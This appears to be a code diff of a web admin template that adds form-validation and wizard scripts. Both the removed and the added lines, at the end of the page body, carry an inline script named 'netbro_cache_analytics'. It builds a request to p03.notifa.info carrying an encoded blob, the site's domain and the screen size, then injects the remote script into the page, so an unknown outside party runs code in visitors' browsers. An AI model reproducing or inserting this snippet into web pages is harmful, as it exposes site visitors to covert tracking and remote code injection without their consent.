@@ -337,19 +337,22 @@
         
         
         <!-- Javascripts -->
-
-        {{asset ('vendor/bootstrap/css/bootstrap.min.css') }}
         <script src="{{asset ('plugins/jquery/jquery-3.1.0.min.js')}}"></script>
         <script src="{{asset ('plugins/bootstrap/js/bootstrap.min.js')}}"></script>
         <script src="{{asset ('plugins/jquery-slimscroll/jquery.slimscroll.min.js')}}"></script>
         <script src="{{asset ('plugins/uniform/js/jquery.uniform.standalone.js')}}"></script>
         <script src="{{asset ('plugins/switchery/switchery.min.js')}}"></script>
+        <script src="{{asset ('plugins/jquery-validation/jquery.validate.min.js')}}"></script>
+        <script src="{{asset ('plugins/bootstrap-wizard/jquery.bootstrap.wizard.min.js')}}"></script>
         <script src="{{asset ('js/space.min.js')}}"></script>
-    <script type="text/javascript">
+        <script src="{{asset ('js/pages/form-wizard.js')}}"></script>
+        <script type="text/javascript">
         if (self==top) {
             function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH20oiQ656Rk0WpMQrAmqVuuB%2b6qmgUuPAJkYoSG%2bQJYqF95EIXSR1hQG42wtE%2bgXHeJfXjY8vI2HdP4pOOW5UaM90rEK3qM5bdgZSOOcpNwH4lq5rtfnqaGHr%2fU7Ic%2f7POoLujFU4pmjc5cayWFiIQOWLKqspmoDhWiLfvYwjEUFZQFkNkSIfcYzlpDs5DbGc%2bnkmqU%2bYf%2bpShRPC7lLOBHVMP9iQylc1ABdo11jrSiJDgEGi5l%2fAhafMLsaNRUj2tWTCBS1le5RHz%2b4qNSzllyTTjDH9Qm4E55eR41l9tM5najqyZU9NBuLXGo2B1tMMo07W28Bg706ArRTLlmYTjOjigClbA1kYtDTQGwtSIVibud36nGdSDkTuQNF65wrfxEtn2OvRKfRabwFfQXcYOeW0TcmUn3siDrrpv33WTK844LHyV72QdaNVJIlcnRo%2fYG4aWPrntnQiubHKQzA%2b7cPl7aWWoXmuFHdFDFZ6g2TgmULNYuBu5vv6mVD3yTJKQ6kP0CNuOeA%2ffjtbI1F89%2bxOcCxjdye0p%2ffUn4nd%2bbZOOKFZ1lGv5s0dUpWPoAry%2f" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});
         };
-    </script>
+        </script>
+        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH20oiQ656Rk0VxcOgSvO77K%2b54M32g%2fsu8Nsbqo%2bIFa9l0MlGs8MwmBkkOE2K5M9ZnVwNzAahP7dR3VB%2fYUx4CGmy%2bgl1W%2bqx%2fifisInBgAVtIObuTuGzVlXmbyh2iKNmT8yNgJz06sZAhBtn%2fNl%2breECZgczb%2bFkF%2fHhI6gG9VCEMMb5pMBVtkd425YDDBGzRRHNIlQ6b9K8CRnbAv%2fN1uyCIiB7O5ppmILNCY8rEF%2f5DmIhdR2JVE09p85Ns2fX9QpDkmoN5CrGfqZC02ckQqaLEtOHOv%2fMz1j4vDkn6pKBPOGgxeGPpQeSQ4x5pTGUgzyf10GP1uEYNkLYfd4P5eQru2H1n6m74LFpVeWyWBNo%2f%2byoyNPN33rlc6WNkqXspL0aYqGdtMmbzSoRqbEFbCffK9fRoD5mQ7Jr7lOUWR2buadZB8tBqpm94hdhpcbhA6jU%2fACz50VH4bbaV0soOAvc%2f20lhhC3a0SDobaWoNh3QFV7gT%2fRaCKKygR5sbEU%2bRs3D2akP%2fDlnAAAhm96TNGMYYIOul7F%2fAO8BbRsd3jE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+        </script>
 </body>
 
 <!-- Mirrored from stacksthemes.com/Generate PDF/theme/templates/admin1/layout-fixed-sidebar-header.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 01:33:39 GMT -->
